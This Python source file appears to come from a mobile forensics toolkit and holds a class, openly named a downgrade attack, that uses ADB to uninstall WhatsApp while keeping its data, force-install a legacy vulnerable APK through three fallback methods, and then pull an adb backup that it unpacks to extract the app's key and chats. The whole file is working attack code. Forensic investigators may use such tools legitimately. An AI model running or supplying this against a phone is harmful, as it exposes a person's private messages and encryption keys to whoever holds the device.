import os
import subprocess
import time
from src.utils import ForensicUtils

class DowngradeAttack:
    def __init__(self, adb_manager):
        self.adb = adb_manager
        self.bin_dir = "bin/payloads"
        self.legacy_apk = os.path.join(self.bin_dir, "LegacyWhatsApp.apk")
        self.abe_jar = os.path.join(self.bin_dir, "abe.jar")
        self.pkg = "com.whatsapp"

    def run(self, output_dir):
        # 1. Validaciones
        if not os.path.exists(self.abe_jar):
            ForensicUtils.log("DOWNGRADE", "CRITICAL", "Falta 'abe.jar'.")
            return False
        if not os.path.exists(self.legacy_apk):
            ForensicUtils.log("DOWNGRADE", "CRITICAL", "Falta 'LegacyWhatsApp.apk'.")
            return False

        ForensicUtils.log("DOWNGRADE", "WARNING", "--- ATAQUE DOWNGRADE: MODO AGRESIVO ---")
        ForensicUtils.log("DOWNGRADE", "INFO", "NO DESCONECTES EL CABLE.")

        try:
            # 2. Desinstalación (Keep Data)
            ForensicUtils.log("DOWNGRADE", "INFO", "[1/4] Ejecutando Swap (Uninstall -k)...")
            subprocess.run(["adb", "shell", "pm", "uninstall", "-k", self.pkg], check=False)
            time.sleep(2)

            # 3. Instalación de versión vulnerable (TRIPLE INTENTO)
            ForensicUtils.log("DOWNGRADE", "INFO", "[2/4] Inyectando Legacy WhatsApp...")
            
            install_success = False
            
            # Método A: Estándar
            try:
                subprocess.run(["adb", "install", "-r", "-d", self.legacy_apk], check=True, stderr=subprocess.PIPE)
                install_success = True
            except subprocess.CalledProcessError:
                pass # Falló A
            
            # Método B: Solo Downgrade
            if not install_success:
                try:
                    subprocess.run(["adb", "install", "-d", self.legacy_apk], check=True, stderr=subprocess.PIPE)
                    install_success = True
                except subprocess.CalledProcessError:
                    pass # Falló B

            # Método C: Shell Injection (La última esperanza)
            if not install_success:
                ForensicUtils.log("DOWNGRADE", "WARNING", "Métodos estándar fallaron. Intentando inyección directa (Shell)...")
                remote_tmp = "/data/local/tmp/LegacyWhatsApp.apk"
                try:
                    # Subir archivo
                    subprocess.run(["adb", "push", self.legacy_apk, remote_tmp], check=True)
                    # Instalar desde adentro
                    res = subprocess.run(["adb", "shell", "pm", "install", "-r", "-d", remote_tmp], capture_output=True, text=True)
                    
                    if "Success" in res.stdout:
                        install_success = True
                        ForensicUtils.log("DOWNGRADE", "SUCCESS", "¡Inyección Shell exitosa!")
                    else:
                        ForensicUtils.log("DOWNGRADE", "CRITICAL", f"Fallo Shell: {res.stdout.strip()}")
                except Exception as e:
                    ForensicUtils.log("DOWNGRADE", "CRITICAL", f"Error en inyección: {str(e)}")

            if not install_success:
                ForensicUtils.log("DOWNGRADE", "CRITICAL", "El sistema operativo bloqueó todas las formas de instalación.")
                return False

            time.sleep(3)

            # 4. Forzar Backup
            backup_file = os.path.join(output_dir, "backup.ab")
            ForensicUtils.log("DOWNGRADE", "WARNING", "[3/4] >>> ACEPTA EL BACKUP EN EL TELÉFONO (Sin clave) <<<")
            subprocess.run(f"adb backup -f {backup_file} -noapk {self.pkg}", shell=True, check=True)

            # 5. Extracción
            if os.path.exists(backup_file) and os.path.getsize(backup_file) > 1000:
                ForensicUtils.log("DOWNGRADE", "SUCCESS", f"Backup capturado ({os.path.getsize(backup_file)} bytes).")
                
                ForensicUtils.log("DOWNGRADE", "INFO", "Extrayendo Key...")
                tar_file = os.path.join(output_dir, "backup.tar")
                cmd = f"java -jar {self.abe_jar} unpack {backup_file} {tar_file}"
                subprocess.run(cmd, shell=True)
                
                ForensicUtils.log("INFO", "TIP", "Revisa 'output/backup.tar' con WinRAR.")
            else:
                ForensicUtils.log("DOWNGRADE", "ERROR", "Backup fallido o vacío.")

            # 6. Aviso
            ForensicUtils.log("DOWNGRADE", "WARNING", "[4/4] Proceso terminado. Reinstala WhatsApp oficial.")
            return True

        except Exception as e:
            ForensicUtils.log("DOWNGRADE", "CRITICAL", f"Fallo en el ataque: {str(e)}")
            return False